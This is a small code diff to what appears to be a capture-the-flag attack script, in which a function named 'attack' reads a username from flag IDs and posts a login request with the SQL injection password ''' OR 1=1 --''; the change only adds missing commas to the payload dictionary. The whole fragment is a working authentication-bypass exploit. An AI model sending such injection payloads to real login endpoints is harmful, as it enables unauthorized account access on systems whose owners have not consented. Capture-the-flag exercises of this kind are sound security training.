@@ -29,8 +29,8 @@ def attack(target: str, flag_ids: str):
     username = json.loads(flag_ids)["username"]
 
     payload = {
-        "username": username
-        "password": "' OR 1=1 --"
+        "username": username,
+        "password": "' OR 1=1 --",
     }
 
     response = requests.post(url, json=payload)
